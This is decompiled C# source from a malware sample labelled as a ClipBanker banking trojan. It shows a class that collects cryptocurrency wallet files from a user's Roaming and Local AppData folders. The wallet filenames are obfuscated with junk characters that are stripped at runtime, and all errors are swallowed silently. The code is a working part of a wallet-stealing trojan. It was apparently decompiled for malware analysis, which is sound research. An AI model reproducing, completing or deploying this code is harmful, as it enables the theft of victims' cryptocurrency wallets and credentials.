// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Applications.LocalWallets
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Data.Extensions;
using FtpClient.Data.Helpers;
using FtpClient.Models.Core;
using FtpClient.Models.Info;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace FtpClient.Data.Applications
{
  public static class LocalWallets
  {
    public static IList<InfoClass9> Get(IEnumerable<IWalletParser> walletParsers)
    {
      List<InfoClass9> infoClass9List = new List<InfoClass9>();
      try
      {
        List<string> source = new List<string>();
        source.AddRange((IEnumerable<string>) FileSystemHelper.FindPaths(Constants.RoamingAppData, 2, 1, new string(new char[19]
        {
          'w',
          'a',
          'a',
          's',
          'f',
          'l',
          'l',
          'e',
          'a',
          's',
          'f',
          't',
          '.',
          'd',
          'a',
          't',
          'a',
          's',
          'f'
        }).Replace("asf", string.Empty), new string(new char[12]
        {
          'w',
          'a',
          'a',
          's',
          'f',
          'l',
          'l',
          'e',
          't',
          'a',
          's',
          'f'
        }).Replace("asf", string.Empty)));
        source.AddRange((IEnumerable<string>) FileSystemHelper.FindPaths(Constants.LocalAppData, 2, 1, new string(new char[19]
        {
          'w',
          'a',
          'a',
          's',
          'f',
          'l',
          'l',
          'e',
          'a',
          's',
          'f',
          't',
          '.',
          'd',
          'a',
          't',
          'a',
          's',
          'f'
        }).Replace("asf", string.Empty), new string(new char[12]
        {
          'w',
          'a',
          'a',
          's',
          'f',
          'l',
          'l',
          'e',
          't',
          'a',
          's',
          'f'
        }).Replace("asf", string.Empty)));
        try
        {
          infoClass9List.AddRange(source.Select<string, FileInfo>((Func<string, FileInfo>) (x => new FileInfo(x))).Select<FileInfo, InfoClass9>((Func<FileInfo, InfoClass9>) (fileInfo => new InfoClass9(fileInfo.FullName)
          {
            Object3 = fileInfo.Directory.Name,
            Object4 = fileInfo.FullName.Replace(Constants.LocalAppData, string.Empty).Replace(Constants.RoamingAppData, string.Empty).TrimStart('\\')
          })).IsNull<IEnumerable<InfoClass9>>());
        }
        catch
        {
        }
        foreach (IWalletParser walletParser in walletParsers)
        {
          try
          {
            infoClass9List.AddRange(walletParser.GetWallets());
          }
          catch
          {
          }
        }
      }
      catch (Exception ex)
      {
      }
      return (IList<InfoClass9>) infoClass9List;
    }
  }
}
